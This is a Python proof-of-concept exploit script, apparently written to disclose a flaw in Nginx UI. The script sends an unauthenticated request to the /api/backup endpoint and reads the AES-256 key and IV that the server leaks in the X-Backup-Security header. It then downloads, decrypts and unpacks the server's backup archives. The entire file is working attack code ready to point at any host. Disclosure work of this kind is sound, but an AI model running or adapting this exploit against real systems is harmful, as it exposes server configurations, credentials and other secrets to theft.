#!/usr/bin/env python3

"""
POC: Unauthenticated Backup Download + Key Disclosure via X-Backup-Security

Usage:
  python poc.py --target http://127.0.0.1:9000 --out backup.bin --decrypt
"""

import argparse
import base64
import os
import sys
import urllib.parse
import urllib.request
import zipfile
from io import BytesIO

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
except ImportError:
    print("Error: pycryptodome required for decryption")
    print("Install with: pip install pycryptodome")
    sys.exit(1)


def _parse_keys(hdr_val: str):
    """
    Parse X-Backup-Security header format: "base64_key:base64_iv"
    Example: e5eWtUkqVEIixQjh253kPYe3cpzdasxiYTbOFHm9CJ4=:7XdVSRcgYfWf7C/J0IS8Cg==
    """
    v = (hdr_val or "").strip()

    # Format is: key:iv (both base64 encoded)
    if ":" in v:
        parts = v.split(":", 1)
        if len(parts) == 2:
            return parts[0].strip(), parts[1].strip()

    return None, None


def decrypt_aes_cbc(encrypted_data: bytes, key_b64: str, iv_b64: str) -> bytes:
    """Decrypt using AES-256-CBC with PKCS#7 padding"""
    key = base64.b64decode(key_b64)
    iv = base64.b64decode(iv_b64)

    if len(key) != 32:
        raise ValueError(f"Invalid key length: {len(key)} (expected 32 bytes for AES-256)")
    if len(iv) != 16:
        raise ValueError(f"Invalid IV length: {len(iv)} (expected 16 bytes)")

    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_data)
    return unpad(decrypted, AES.block_size)


def extract_backup(encrypted_zip_path: str, key_b64: str, iv_b64: str, output_dir: str):
    """Extract and decrypt the backup archive"""
    print(f"\n[*] Extracting encrypted backup to {output_dir}")

    os.makedirs(output_dir, exist_ok=True)

    # Extract the main ZIP (contains encrypted files)
    with zipfile.ZipFile(encrypted_zip_path, 'r') as main_zip:
        print(f"[*] Main archive contains: {main_zip.namelist()}")
        main_zip.extractall(output_dir)

    # Decrypt each file
    encrypted_files = ["hash_info.txt", "nginx-ui.zip", "nginx.zip"]

    for filename in encrypted_files:
        filepath = os.path.join(output_dir, filename)
        if not os.path.exists(filepath):
            print(f"[!] Warning: {filename} not found")
            continue

        print(f"[*] Decrypting {filename}...")

        with open(filepath, "rb") as f:
            encrypted = f.read()

        try:
            decrypted = decrypt_aes_cbc(encrypted, key_b64, iv_b64)

            # Write decrypted file
            decrypted_path = filepath.replace(".zip", "_decrypted.zip") if filename.endswith(".zip") else filepath + ".decrypted"
            with open(decrypted_path, "wb") as f:
                f.write(decrypted)

            print(f"    → Saved to {decrypted_path} ({len(decrypted)} bytes)")

            # If it's a ZIP, extract it
            if filename.endswith(".zip"):
                extract_dir = os.path.join(output_dir, filename.replace(".zip", ""))
                os.makedirs(extract_dir, exist_ok=True)
                with zipfile.ZipFile(BytesIO(decrypted), 'r') as inner_zip:
                    inner_zip.extractall(extract_dir)
                    print(f"    → Extracted {len(inner_zip.namelist())} files to {extract_dir}")

        except Exception as e:
            print(f"    ✗ Failed to decrypt {filename}: {e}")

    # Show hash info
    hash_info_path = os.path.join(output_dir, "hash_info.txt.decrypted")
    if os.path.exists(hash_info_path):
        print(f"\n[*] Hash info:")
        with open(hash_info_path, "r") as f:
            print(f.read())

def main():
    ap = argparse.ArgumentParser(
        description="Nginx UI - Unauthenticated backup download with key disclosure"
    )
    ap.add_argument("--target", required=True, help="Base URL, e.g. http://host:port")
    ap.add_argument("--out", default="backup.bin", help="Where to save the encrypted backup")
    ap.add_argument("--decrypt", action="store_true", help="Decrypt the backup after download")
    ap.add_argument("--extract-dir", default="backup_extracted", help="Directory to extract decrypted files")

    args = ap.parse_args()

    url = urllib.parse.urljoin(args.target.rstrip("/") + "/", "api/backup")

    # Unauthenticated request to the backup endpoint
    req = urllib.request.Request(url, method="GET")

    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            hdr = resp.headers.get("X-Backup-Security", "")
            key, iv = _parse_keys(hdr)
            data = resp.read()
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error {e.code}: {e.reason}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

    with open(args.out, "wb") as f:
        f.write(data)

    # Key/IV disclosure in response header enables decryption of the downloaded backup
    print(f"\nX-Backup-Security: {hdr}")
    print(f"Parsed AES-256 key: {key}")
    print(f"Parsed AES IV    : {iv}")

    if key and iv:
        # Verify key/IV lengths
        try:
            key_bytes = base64.b64decode(key)
            iv_bytes = base64.b64decode(iv)
            print(f"\n[*] Key length: {len(key_bytes)} bytes (AES-256 ✓)")
            print(f"[*] IV length : {len(iv_bytes)} bytes (AES block size ✓)")
        except Exception as e:
            print(f"[!] Error decoding keys: {e}")
            sys.exit(1)

        if args.decrypt:
            try:
                extract_backup(args.out, key, iv, args.extract_dir)

            except Exception as e:
                print(f"\n[!] Decryption failed: {e}")
                import traceback
                traceback.print_exc()
                sys.exit(1)
    else:
        print("\n[!] Failed to parse encryption keys from X-Backup-Security header")
        print(f"    Header value: {hdr}")

if __name__ == "__main__":
    main()
